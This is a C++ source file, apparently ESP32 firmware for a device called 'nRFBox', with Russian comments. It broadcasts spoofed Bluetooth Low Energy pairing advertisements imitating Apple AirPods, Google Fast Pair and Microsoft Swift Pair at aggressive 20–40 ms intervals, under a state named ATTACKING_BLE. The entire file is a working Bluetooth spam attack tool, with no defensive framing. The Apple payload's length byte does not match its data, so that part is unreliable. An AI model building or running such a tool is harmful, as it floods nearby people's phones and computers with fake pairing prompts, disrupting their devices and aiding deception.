#include "BleManager.h"
#include "System.h"

BleManager& BleManager::getInstance() { 
    static BleManager i; 
    return i; 
}

BleManager::BleManager() : 
    _isRunning(false), 
    _pAdvertising(nullptr), 
    _packetsSent(0), 
    _currentType(BleSpoofType::APPLE_AIRPODS) 
{}

void BleManager::setup() { 
    BLEDevice::init("nRFBox"); 
    _pAdvertising = BLEDevice::getAdvertising(); 
}

void BleManager::stop() { 
    if(_isRunning && _pAdvertising) { 
        _pAdvertising->stop(); 
        _isRunning = false; 
    } 
}

void BleManager::startSpoof(BleSpoofType type) {
    stop(); // Сначала останавливаем, если что-то шло
    _currentType = type; 
    setPayload(type);
    
    // Агрессивные настройки для быстрого обнаружения
    _pAdvertising->setMinInterval(0x20); // 20ms
    _pAdvertising->setMaxInterval(0x40); // 40ms
    _pAdvertising->start(); 
    _isRunning = true;
}

void BleManager::setPayload(BleSpoofType type) {
    BLEAdvertisementData ad; 
    std::string p;
    
    if (type == BleSpoofType::APPLE_AIRPODS) {
        // Apple Mfg ID: 0x004C, Type: 0x07 (Proximity Pair), Length: 0x19
        char d[] = { 0x4C, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x55, 0xAA, 0x01 }; 
        p.assign(d, sizeof(d)); 
        ad.setManufacturerData(p);
    } 
    else if (type == BleSpoofType::ANDROID_FASTPAIR) {
        // Google Fast Pair Service UUID: 0xFE2C
        ad.setServiceData(BLEUUID((uint16_t)0xFE2C), "\x00\x01\x02"); 
        ad.setFlags(0x06); // General Discoverable + BLE Only
    }
    else if (type == BleSpoofType::WINDOWS_SWIFT) {
        // Microsoft Swift Pair Mfg ID: 0x0006
        char d[] = { 0x06, 0x00, 0x03, 0x00, 0x80 }; 
        p.assign(d, sizeof(d)); 
        ad.setManufacturerData(p);
    }
    _pAdvertising->setAdvertisementData(ad);
}

bool BleManager::loop(StatusMessage& out) {
    if(!_isRunning) { 
        out.state = SystemState::IDLE; 
        return false; 
    }
    
    out.state = SystemState::ATTACKING_BLE; 
    _packetsSent++; 
    out.packetsSent = _packetsSent;
    
    snprintf(out.logMsg, MAX_LOG_MSG, "Spoofing...");
    vTaskDelay(100); // Небольшая задержка, чтобы не спамить в лог, BLE работает в фоне
    return true;
}